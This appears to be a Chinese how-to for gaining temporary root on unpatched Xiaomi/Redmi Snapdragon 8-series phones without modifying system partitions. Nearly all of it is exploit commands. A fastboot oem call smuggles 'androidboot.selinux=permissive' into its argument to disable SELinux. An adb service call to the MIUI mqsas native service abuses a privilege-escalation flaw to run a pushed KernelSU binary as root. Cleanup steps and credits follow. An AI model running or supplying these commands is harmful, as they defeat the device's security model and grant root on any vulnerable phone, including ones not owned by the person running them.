> [!IMPORTANT]
> 设备必须是小米红米，芯片必须是高通骁龙8系，且未更新2月补丁

> [!WARNING]
> 严禁修改系统分区，严禁使用可修改系统分区的模块等，笔者不为任何人的任何过失负责

> [!NOTE]
> 重启一次会失效

1. **在FB界面中进行：**
`fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive` ##设置SELinux宽容，每次开机都要执行
`fastboot continue`##在FASTBOOT中直接引导系统，每次开机都要执行

2. **在系统中进行：（依次）**
`adb push ksud /data/local/tmp/`##只需执行一次
`adb shell chmod 777 /data/local/tmp/ksud`##只需执行一次
`adb shell service call miui.mqsas.IMQSNative 21 i32 1 s16 "/data/local/tmp/ksud" i32 1 s16 'late-load' s16 '/sdcard/ksulog.txt' i32 60` ##漏洞提权，每次开机都要执行
至此成功

`adb shell su -c setenforce 1`##恢复SELinux严格，每次开机都要执行，可选（建议）


**全身而退的办法**：
清空`data\adb`和`data\local\tmp`中的相关内容即可完全复原设备。

侵权请致邮件至mail@jiayv.wang，我将妥善处理此事。
教程来自网络整合，主要来自酷安@上善若水，在此一并致谢。